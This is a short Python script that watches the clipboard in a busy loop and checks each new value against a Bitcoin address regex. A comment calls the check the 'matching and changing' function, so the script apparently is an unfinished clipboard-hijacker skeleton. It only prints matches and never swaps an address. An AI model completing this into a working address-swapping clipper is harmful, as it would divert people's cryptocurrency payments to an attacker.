import pyperclip
import asyncio
import re

# For all possible BTC wallet configuration 
BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{27,34}|bc1[a-z0-9]{39,59})' #'([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}'

bitcoin_addresses = [
    '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2', # True
    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy', # True
    'bc1qar1srrr0xfkvy5r643hydnw9re59gtzzwf5mdq' # False ('0' char) #'([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}' 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
    ]
for addr in bitcoin_addresses:
    print(re.match(BTC_ADDRESS_MATCH, addr))

# Matching and changing btc function.
async def btc_address(value):
    
    text = re.match(BTC_ADDRESS_MATCH , value)
    
    print (text)
        
    #print(value)


async def wait4update(value):
    while True:
        if pyperclip.paste() != value : # If the clipboard changed.
            return

async def main():
    value = pyperclip.paste() # Set the default value.
    while True :
        update = asyncio.create_task(wait4update(value))
        await update
        value = pyperclip.paste() # Change the value.    
        asyncio.create_task(btc_address(value)) #Start your function.

asyncio.run(main())

